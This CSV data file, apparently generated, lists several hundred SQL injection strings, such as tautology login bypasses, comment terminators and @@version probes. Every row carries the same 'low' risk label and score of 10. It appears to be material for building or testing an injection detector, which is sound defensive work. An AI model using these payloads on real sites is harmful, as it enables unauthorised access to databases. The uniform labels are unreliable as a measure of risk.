query,risk,score
1' or '1'='1 # l9r3y,low,10
' || 1=1 -- -- se9v,low,10
1' OR '1'='1 /**/ # ,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
1' OR '1'='1 /**/ # ,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 'x'='x AND 1=1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 'a'='a # 81k6q,low,10
admin' /**/ /**/ # ,low,10
' OR 'a'='a LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' OR 'a'='a OR 1=1 -- ,low,10
1' or true -- -- eixq,low,10
' or 'a'='a # skixw,low,10
admin' -- -- ou92,low,10
' OR 'x'='x OR 1=1 -- ,low,10
1' OR '1'='1 /**/ # ,low,10
' || 1=1 -- -- stdt,low,10
admin' -- LIMIT 1,low,10
1' or 1=1 -- # r1sqt,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' OR '1'='1 AND 1=1,low,10
admin' /**/ OR 1=1 -- ,low,10
1' OR '1'='1 LIMIT 1,low,10
admin' -- -- y1fl,low,10
' OR 1=1 -- /**/ # ,low,10
""" OR ""1""=""1 -- i2bm",low,10
""" OR ""1""=""1 AND 1=1",low,10
' OR 1=1 -- -- ts9f,low,10
' OR 'x'='x # v71ny,low,10
admin' /**/ /**/ # ,low,10
1' OR '1'='1 LIMIT 1,low,10
' or 'a'='a # c8hdx,low,10
admin' -- /**/ # ,low,10
' OR 'a'='a AND 1=1,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1=1 -- # pcox7,low,10
""" OR ""1""=""1 # fcv0g",low,10
admin' /**/ -- 6g7z,low,10
1' OR '1'='1 /**/ # ,low,10
admin' -- AND 1=1,low,10
1' OR '1'='1 /**/ # ,low,10
' OR 1=1 -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 'a'='a -- 2zdl,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
1' or true -- # ggzxr,low,10
1' or '1'='1 # x09b3,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' OR '1'='1 -- nnet,low,10
1' or true -- -- nvo5,low,10
' OR 1=1 -- -- i06w,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
admin' -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- pgyv,low,10
admin' -- -- yzmq,low,10
1' or '1'='1 # r22ik,low,10
1' or '1'='1 LIMIT 1,low,10
admin' -- -- 53vd,low,10
' || 1=1 -- OR 1=1 -- ,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' or true -- LIMIT 1,low,10
""" OR ""1""=""1 -- 9t53",low,10
admin' /**/ -- ffw9,low,10
""" OR ""1""=""1 LIMIT 1",low,10
' or 'a'='a LIMIT 1,low,10
' || 1=1 -- -- t4h9,low,10
' OR 1=1 -- LIMIT 1,low,10
""" OR ""1""=""1 # y2jv4",low,10
1' or 1=1 -- # 1lp6k,low,10
' or 'a'='a OR 1=1 -- ,low,10
admin' /**/ -- htrx,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 'x'='x /**/ # ,low,10
1' or true -- AND 1=1,low,10
admin' -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
1' or true -- /**/ # ,low,10
1' or '1'='1 LIMIT 1,low,10
1' OR '1'='1 -- u49m,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 'x'='x /**/ # ,low,10
1' or '1'='1 # crsgc,low,10
admin' /**/ # cdhlz,low,10
1' or 1=1 -- /**/ # ,low,10
1' or true -- /**/ # ,low,10
admin' /**/ # j0bui,low,10
1' OR '1'='1 # j4rad,low,10
1' or 1=1 -- AND 1=1,low,10
' || 1=1 -- /**/ # ,low,10
' OR 'a'='a # 0ns37,low,10
admin' -- -- sk8q,low,10
admin' /**/ -- s2nv,low,10
' OR 'a'='a LIMIT 1,low,10
' || 1=1 -- LIMIT 1,low,10
admin' -- # cgbpn,low,10
admin' -- OR 1=1 -- ,low,10
' or 'a'='a /**/ # ,low,10
' OR 'a'='a LIMIT 1,low,10
""" OR ""1""=""1 LIMIT 1",low,10
admin' -- -- fvc1,low,10
1' OR '1'='1 /**/ # ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
1' or true -- /**/ # ,low,10
admin' /**/ AND 1=1,low,10
' OR 1=1 -- LIMIT 1,low,10
' OR 1=1 -- LIMIT 1,low,10
1' or '1'='1 -- hhkq,low,10
' or 'a'='a LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' OR 'a'='a -- enl1,low,10
' OR 1=1 -- /**/ # ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
""" OR ""1""=""1 # 6hl4l",low,10
' OR 'x'='x AND 1=1,low,10
admin' /**/ /**/ # ,low,10
1' OR '1'='1 # 22phy,low,10
' OR 1=1 -- -- 81jf,low,10
' || 1=1 -- -- rf5x,low,10
1' OR '1'='1 LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
admin' -- # dl1jy,low,10
1' or true -- -- hgsl,low,10
' or 'a'='a LIMIT 1,low,10
' or 'a'='a /**/ # ,low,10
' OR 1=1 LIMIT 1 -- # dmyhb,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' or 'a'='a LIMIT 1,low,10
""" OR ""1""=""1 AND 1=1",low,10
' OR 'x'='x OR 1=1 -- ,low,10
admin' -- LIMIT 1,low,10
' OR 'a'='a AND 1=1,low,10
' OR 1=1 LIMIT 1 -- -- jowy,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
admin' /**/ -- ztxp,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' or 1=1 -- /**/ # ,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
1' OR '1'='1 /**/ # ,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
""" OR ""1""=""1 # t4z36",low,10
' or 'a'='a /**/ # ,low,10
""" OR ""1""=""1 # ffcey",low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' OR '1'='1 -- r3il,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 'a'='a AND 1=1,low,10
admin' /**/ AND 1=1,low,10
' OR 1=1 -- # 7pvjd,low,10
admin' -- /**/ # ,low,10
' || 1=1 -- AND 1=1,low,10
1' or 1=1 -- -- hcns,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
1' or 1=1 -- # 83yey,low,10
1' or 1=1 -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' OR 1=1 -- # 83fh3,low,10
admin' -- AND 1=1,low,10
admin' -- /**/ # ,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 'x'='x LIMIT 1,low,10
1' OR '1'='1 AND 1=1,low,10
1' OR '1'='1 -- van2,low,10
' OR 'x'='x -- 6qer,low,10
admin' -- OR 1=1 -- ,low,10
admin' -- -- l2fo,low,10
' or 'a'='a LIMIT 1,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
' OR 'a'='a # 1ui5m,low,10
1' or true -- -- 0ml2,low,10
' OR 1=1 -- AND 1=1,low,10
' or 'a'='a # 0imox,low,10
1' OR '1'='1 /**/ # ,low,10
1' or true -- LIMIT 1,low,10
1' or true -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 'a'='a AND 1=1,low,10
' || 1=1 -- /**/ # ,low,10
1' or '1'='1 LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- # 31b6r,low,10
1' OR '1'='1 /**/ # ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' -- AND 1=1,low,10
1' or 1=1 -- LIMIT 1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' || 1=1 -- AND 1=1,low,10
admin' -- OR 1=1 -- ,low,10
1' or '1'='1 LIMIT 1,low,10
admin' -- # ipnx9,low,10
' || 1=1 -- OR 1=1 -- ,low,10
admin' -- AND 1=1,low,10
1' or true -- LIMIT 1,low,10
' OR 'x'='x LIMIT 1,low,10
' or 'a'='a LIMIT 1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 'a'='a -- 79sw,low,10
1' OR '1'='1 -- rpko,low,10
1' or 1=1 -- # zvvhc,low,10
1' or 1=1 -- -- l0kd,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
' || 1=1 -- -- bdpa,low,10
' OR 1=1 -- -- r52r,low,10
admin' -- LIMIT 1,low,10
admin' /**/ OR 1=1 -- ,low,10
admin' -- -- frtf,low,10
admin' -- OR 1=1 -- ,low,10
' or 'a'='a # x2bv2,low,10
1' or '1'='1 AND 1=1,low,10
admin' -- LIMIT 1,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
1' or '1'='1 AND 1=1,low,10
' OR 1=1 -- # pxm12,low,10
1' or true -- OR 1=1 -- ,low,10
' OR 'a'='a /**/ # ,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
1' OR '1'='1 AND 1=1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' or 'a'='a -- fgu7,low,10
admin' -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- -- cdgp,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
admin' -- LIMIT 1,low,10
admin' -- # u3hz2,low,10
' OR 'x'='x OR 1=1 -- ,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 1=1 -- AND 1=1,low,10
1' or true -- /**/ # ,low,10
1' or 1=1 -- /**/ # ,low,10
' || 1=1 -- # nz070,low,10
1' or '1'='1 # tfj5v,low,10
' OR 1=1 -- AND 1=1,low,10
admin' -- OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
1' or 1=1 -- LIMIT 1,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' -- AND 1=1,low,10
admin' -- OR 1=1 -- ,low,10
' || 1=1 -- OR 1=1 -- ,low,10
1' OR '1'='1 # w1j3d,low,10
1' or true -- AND 1=1,low,10
' OR 'x'='x /**/ # ,low,10
' or 'a'='a LIMIT 1,low,10
1' OR '1'='1 # 1nxtf,low,10
' OR 'x'='x # ook5r,low,10
1' OR '1'='1 LIMIT 1,low,10
""" OR ""1""=""1 AND 1=1",low,10
1' or 1=1 -- # ici70,low,10
1' or true -- # dajum,low,10
1' or 1=1 -- LIMIT 1,low,10
1' or true -- /**/ # ,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' || 1=1 -- # rdjqc,low,10
' || 1=1 -- -- r5zl,low,10
' OR 1=1 -- LIMIT 1,low,10
' || 1=1 -- /**/ # ,low,10
1' or 1=1 -- AND 1=1,low,10
' OR 'x'='x # gwzgt,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 'a'='a LIMIT 1,low,10
' || 1=1 -- /**/ # ,low,10
admin' -- /**/ # ,low,10
admin' /**/ # 251x3,low,10
1' or '1'='1 # lcvum,low,10
' || 1=1 -- /**/ # ,low,10
1' or 1=1 -- AND 1=1,low,10
' or 'a'='a /**/ # ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' || 1=1 -- LIMIT 1,low,10
1' or true -- -- egv9,low,10
1' or 1=1 -- AND 1=1,low,10
1' or true -- -- 5f5d,low,10
1' or '1'='1 LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
1' OR '1'='1 AND 1=1,low,10
""" OR ""1""=""1 -- rv6e",low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 'x'='x # ie6jd,low,10
1' or true -- # kh6ye,low,10
admin' /**/ /**/ # ,low,10
' or 'a'='a AND 1=1,low,10
' or 'a'='a /**/ # ,low,10
' || 1=1 -- -- gesz,low,10
' || 1=1 -- /**/ # ,low,10
' or 'a'='a # u25d1,low,10
' or 'a'='a /**/ # ,low,10
1' OR '1'='1 # kx4w6,low,10
admin' /**/ # hrz4f,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
' || 1=1 -- # kbwo9,low,10
1' or '1'='1 -- dm0p,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
admin' /**/ AND 1=1,low,10
' OR 1=1 -- /**/ # ,low,10
admin' -- OR 1=1 -- ,low,10
1' or 1=1 -- # i357n,low,10
' or 'a'='a /**/ # ,low,10
' OR 'x'='x /**/ # ,low,10
' || 1=1 -- /**/ # ,low,10
admin' /**/ /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
' OR 'a'='a AND 1=1,low,10
' OR 1=1 LIMIT 1 -- -- hf32,low,10
admin' /**/ LIMIT 1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' OR 'x'='x -- 0bsv,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 1=1 -- /**/ # ,low,10
admin' /**/ # p6kut,low,10
' OR 'a'='a /**/ # ,low,10
1' OR '1'='1 # 2n7o4,low,10
' OR 'x'='x AND 1=1,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' OR '1'='1 AND 1=1,low,10
1' or '1'='1 AND 1=1,low,10
' OR 1=1 -- LIMIT 1,low,10
' or 'a'='a OR 1=1 -- ,low,10
' or 'a'='a # 078xw,low,10
""" OR ""1""=""1 AND 1=1",low,10
1' or true -- -- uz3s,low,10
' OR 1=1 LIMIT 1 -- -- mhzx,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' or 'a'='a -- iv7u,low,10
""" OR ""1""=""1 # esfdc",low,10
' || 1=1 -- # m3m8k,low,10
1' OR '1'='1 -- oor6,low,10
admin' /**/ LIMIT 1,low,10
' || 1=1 -- -- r883,low,10
' OR 'a'='a # xs9mi,low,10
' OR 1=1 -- # cr3ui,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
1' OR '1'='1 /**/ # ,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
admin' /**/ # fvpwt,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' or '1'='1 # lwvzr,low,10
1' or '1'='1 LIMIT 1,low,10
' || 1=1 -- -- y2yk,low,10
admin' -- # drjx3,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- -- 8yfz,low,10
1' or true -- -- y62i,low,10
""" OR ""1""=""1 # s3vfk",low,10
admin' -- AND 1=1,low,10
' || 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
1' or true -- -- krc7,low,10
' OR 1=1 -- -- 9mi6,low,10
""" OR ""1""=""1 # 9pqee",low,10
' OR 'a'='a AND 1=1,low,10
' or 'a'='a AND 1=1,low,10
1' or true -- AND 1=1,low,10
admin' -- -- fbn1,low,10
' || 1=1 -- LIMIT 1,low,10
admin' -- LIMIT 1,low,10
' or 'a'='a OR 1=1 -- ,low,10
admin' -- AND 1=1,low,10
admin' -- OR 1=1 -- ,low,10
admin' /**/ OR 1=1 -- ,low,10
1' or true -- -- w0em,low,10
' OR 1=1 LIMIT 1 -- # wuq62,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 'a'='a # ld189,low,10
' OR 'x'='x # sj2p3,low,10
' OR 1=1 -- /**/ # ,low,10
1' OR '1'='1 # gemqx,low,10
' OR 'x'='x AND 1=1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
1' OR '1'='1 AND 1=1,low,10
1' or true -- AND 1=1,low,10
1' or '1'='1 AND 1=1,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 1 IN (SELECT @@version) -- -- 2ruu,low,10
1' or 1=1 -- -- k9wn,low,10
' or 'a'='a AND 1=1,low,10
' || 1=1 -- AND 1=1,low,10
1' OR '1'='1 AND 1=1,low,10
admin' /**/ AND 1=1,low,10
1' or '1'='1 LIMIT 1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 'x'='x AND 1=1,low,10
""" OR ""1""=""1 /**/ # ",low,10
admin' -- /**/ # ,low,10
1' OR '1'='1 /**/ # ,low,10
1' or 1=1 -- LIMIT 1,low,10
admin' -- # 7vz9t,low,10
' OR 'a'='a -- q63c,low,10
' OR 1=1 -- /**/ # ,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 1=1 LIMIT 1 -- # prz2b,low,10
1' or 1=1 -- -- 3t4d,low,10
' or 'a'='a # o78vo,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 1=1 -- # 3qs0n,low,10
1' or '1'='1 AND 1=1,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 1=1 -- LIMIT 1,low,10
1' OR '1'='1 -- frm9,low,10
admin' -- -- fjy9,low,10
1' or '1'='1 -- s9yh,low,10
1' or 1=1 -- /**/ # ,low,10
admin' /**/ -- 74ao,low,10
' OR 'x'='x LIMIT 1,low,10
admin' /**/ -- 27we,low,10
1' or 1=1 -- AND 1=1,low,10
admin' /**/ AND 1=1,low,10
admin' -- LIMIT 1,low,10
""" OR ""1""=""1 /**/ # ",low,10
1' or 1=1 -- OR 1=1 -- ,low,10
1' or true -- LIMIT 1,low,10
' or 'a'='a AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
1' or '1'='1 AND 1=1,low,10
' OR 'x'='x AND 1=1,low,10
1' or true -- # 49o4r,low,10
1' or true -- # ym3h9,low,10
""" OR ""1""=""1 -- em96",low,10
' OR 1=1 -- OR 1=1 -- ,low,10
1' OR '1'='1 AND 1=1,low,10
1' OR '1'='1 # pk59z,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' or true -- # f7wu1,low,10
' or 'a'='a -- hgxv,low,10
1' OR '1'='1 -- jep8,low,10
' OR 1 IN (SELECT @@version) -- # 9htkj,low,10
' || 1=1 -- # gtexp,low,10
1' or '1'='1 # 56fe2,low,10
""" OR ""1""=""1 -- k7ix",low,10
' || 1=1 -- AND 1=1,low,10
admin' -- -- eox6,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
admin' -- # y65g9,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or true -- LIMIT 1,low,10
1' or true -- OR 1=1 -- ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
admin' -- /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' || 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 'a'='a # 9frih,low,10
admin' -- AND 1=1,low,10
' OR 'a'='a -- wnwi,low,10
' || 1=1 -- # t1tct,low,10
admin' -- /**/ # ,low,10
1' or 1=1 -- -- a8mz,low,10
' OR 'x'='x OR 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- # fmu7z,low,10
' OR 1=1 -- # kcijb,low,10
' or 'a'='a # oca9m,low,10
' OR 'a'='a /**/ # ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- -- clsh,low,10
""" OR ""1""=""1 /**/ # ",low,10
' or 'a'='a AND 1=1,low,10
' or 'a'='a # lnyeh,low,10
admin' -- -- ip9e,low,10
1' or true -- LIMIT 1,low,10
1' or true -- -- 1td2,low,10
1' or '1'='1 /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' OR 'a'='a LIMIT 1,low,10
1' or true -- OR 1=1 -- ,low,10
' OR 1=1 -- -- ttr6,low,10
' || 1=1 -- -- 94y0,low,10
1' or true -- # f4t1z,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 1=1 -- LIMIT 1,low,10
' || 1=1 -- # wxvwf,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
""" OR ""1""=""1 AND 1=1",low,10
' OR 'a'='a # pv1ku,low,10
' OR 'a'='a AND 1=1,low,10
' or 'a'='a LIMIT 1,low,10
' or 'a'='a LIMIT 1,low,10
admin' /**/ AND 1=1,low,10
1' or 1=1 -- # 577ab,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' OR 'a'='a -- bbgs,low,10
admin' -- /**/ # ,low,10
' or 'a'='a LIMIT 1,low,10
""" OR ""1""=""1 AND 1=1",low,10
""" OR ""1""=""1 -- t857",low,10
' OR 1=1 -- OR 1=1 -- ,low,10
1' or '1'='1 # qgxwf,low,10
1' OR '1'='1 # i8a7t,low,10
1' OR '1'='1 /**/ # ,low,10
' || 1=1 -- OR 1=1 -- ,low,10
admin' -- # 0u19k,low,10
' OR 'x'='x OR 1=1 -- ,low,10
admin' -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- # 9ek5v,low,10
""" OR ""1""=""1 # zz9ma",low,10
admin' -- LIMIT 1,low,10
' or 'a'='a OR 1=1 -- ,low,10
admin' -- # 7uy7q,low,10
""" OR ""1""=""1 LIMIT 1",low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
' or 'a'='a LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- # kcw5g,low,10
admin' -- /**/ # ,low,10
' OR 'a'='a /**/ # ,low,10
admin' /**/ /**/ # ,low,10
' OR 'x'='x -- 91tv,low,10
' OR 1 IN (SELECT @@version) -- -- 707v,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
admin' -- -- gp8g,low,10
1' or true -- -- z03a,low,10
' or 'a'='a # p8xyx,low,10
' OR 1=1 -- AND 1=1,low,10
admin' -- -- 2t1j,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
' || 1=1 -- /**/ # ,low,10
admin' -- /**/ # ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' -- OR 1=1 -- ,low,10
admin' -- OR 1=1 -- ,low,10
1' or true -- LIMIT 1,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
' or 'a'='a # 0lcq0,low,10
' OR 'a'='a AND 1=1,low,10
' or 'a'='a /**/ # ,low,10
1' OR '1'='1 LIMIT 1,low,10
1' or true -- # 9zdo9,low,10
' OR 1=1 LIMIT 1 -- -- nx68,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or '1'='1 OR 1=1 -- ,low,10
' OR 1=1 -- -- 2v0i,low,10
1' or '1'='1 OR 1=1 -- ,low,10
1' or '1'='1 # esgn1,low,10
' or 'a'='a -- fltm,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
' or 'a'='a OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' OR 1=1 -- # ymk40,low,10
""" OR ""1""=""1 AND 1=1",low,10
1' OR '1'='1 # gjwlr,low,10
1' OR '1'='1 -- xs3v,low,10
1' or true -- OR 1=1 -- ,low,10
' || 1=1 -- AND 1=1,low,10
1' OR '1'='1 -- mhgv,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
admin' -- -- g8os,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' -- -- 9gf7,low,10
1' or 1=1 -- AND 1=1,low,10
' OR 1=1 -- OR 1=1 -- ,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
""" OR ""1""=""1 -- 5727",low,10
' OR 'x'='x /**/ # ,low,10
' OR 1=1 -- -- ui9q,low,10
' OR 'a'='a AND 1=1,low,10
1' or 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' -- AND 1=1,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 1=1 -- -- 0cfq,low,10
admin' /**/ AND 1=1,low,10
admin' -- AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
' or 'a'='a -- pnys,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' /**/ AND 1=1,low,10
""" OR ""1""=""1 LIMIT 1",low,10
admin' -- # w5e1y,low,10
admin' -- LIMIT 1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
1' or 1=1 -- /**/ # ,low,10
admin' /**/ # tnj3g,low,10
""" OR ""1""=""1 LIMIT 1",low,10
1' or 1=1 -- # 15c7u,low,10
1' or true -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
' or 'a'='a LIMIT 1,low,10
' OR 'x'='x -- 9jwj,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
' or 'a'='a AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or 1=1 -- # 9c0pf,low,10
admin' -- # 1kf67,low,10
' or 'a'='a LIMIT 1,low,10
' or 'a'='a # i7s4p,low,10
' OR 'x'='x -- d512,low,10
1' OR '1'='1 LIMIT 1,low,10
' OR 'a'='a LIMIT 1,low,10
' or 'a'='a AND 1=1,low,10
admin' -- # oyhix,low,10
1' OR '1'='1 # zsj9j,low,10
1' or '1'='1 # fiq4r,low,10
1' or 1=1 -- /**/ # ,low,10
admin' -- LIMIT 1,low,10
1' or 1=1 -- # ohqy6,low,10
""" OR ""1""=""1 # 8dqre",low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
""" OR ""1""=""1 LIMIT 1",low,10
admin' -- -- cci3,low,10
admin' -- # 7ul44,low,10
admin' -- OR 1=1 -- ,low,10
' OR 'a'='a LIMIT 1,low,10
admin' /**/ /**/ # ,low,10
1' OR '1'='1 -- 3xk3,low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
1' or '1'='1 # 7r78d,low,10
1' or true -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
' or 'a'='a # v7owl,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
1' or '1'='1 -- 1qi9,low,10
1' OR '1'='1 AND 1=1,low,10
' OR 1=1 -- AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
""" OR ""1""=""1 -- y20t",low,10
1' or true -- # s8vlj,low,10
' OR 1=1 LIMIT 1 -- # o1c88,low,10
' OR 'a'='a # jh97p,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
admin' -- LIMIT 1,low,10
' OR 'x'='x LIMIT 1,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
1' or 1=1 -- -- iov4,low,10
1' or true -- /**/ # ,low,10
